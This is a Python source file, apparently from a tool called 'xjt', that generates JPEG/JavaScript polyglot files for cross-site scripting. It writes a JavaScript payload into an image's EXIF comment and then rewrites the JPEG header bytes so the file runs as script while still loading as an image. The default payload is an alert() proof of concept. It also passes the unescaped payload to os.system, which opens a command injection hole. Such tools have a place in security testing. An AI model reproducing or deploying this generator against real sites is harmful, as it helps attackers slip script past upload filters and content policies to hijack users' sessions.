from shlex import quote
from PIL import Image
from io import BytesIO
import os, struct

import pkg_resources

TEMP_FILE = 'temp.jpg'
PAYLOAD_FORMAT = "*/={js_payload}/*"
EXIFTOOL_CMD = "exiftool -Comment='{payload}' {image_file} -w"
HEADER_LEN = 0x2f2a

def get_skeleton_image(width, height):
    skele_file = pkg_resources.resource_stream('xjt', 'data/burp.jpg')

    im = Image.open(skele_file)

    if width >= 0 and height >= 0:
        im = im.resize((width, height))
    im.save('./'+TEMP_FILE)

def add_comment_payload(js_payload):
    payload = PAYLOAD_FORMAT.format(js_payload=js_payload)
    if_q = quote(TEMP_FILE)
    c = EXIFTOOL_CMD.format(payload=payload, image_file=if_q)

    os.system(c)
    return payload


def generate_payload(width=-1, height=-1, js_payload='alert("XSS EXPLOITED!");', output_file = "xjt.jpg"):
    get_skeleton_image(width, height)
    payload = add_comment_payload(js_payload)
    with open(TEMP_FILE, "rb") as f:
        bin_data = f.read()

    h_raw = bin_data[4:6]
    prev_h_len = struct.unpack(">H", h_raw)[0]
    bin_data = list(bin_data)
    bin_data[4] = ord('/')
    bin_data[5] = ord('*')
    bin_data[6+prev_h_len+len(payload)+3] = 0xd9
    bin_data = bin_data[:6+prev_h_len-2] + [0 for _i in range(HEADER_LEN - prev_h_len)] + bin_data[6+prev_h_len-2:]
    bin_data[-6] = ord('*')
    bin_data[-5] = ord('/')
    bin_data[-4] = ord('/')
    bin_data[-3] = ord('/')
    with open(output_file, "wb") as f:
        f.write(bytes(bin_data))

    os.remove(TEMP_FILE)
    os.remove(TEMP_FILE+"_original")
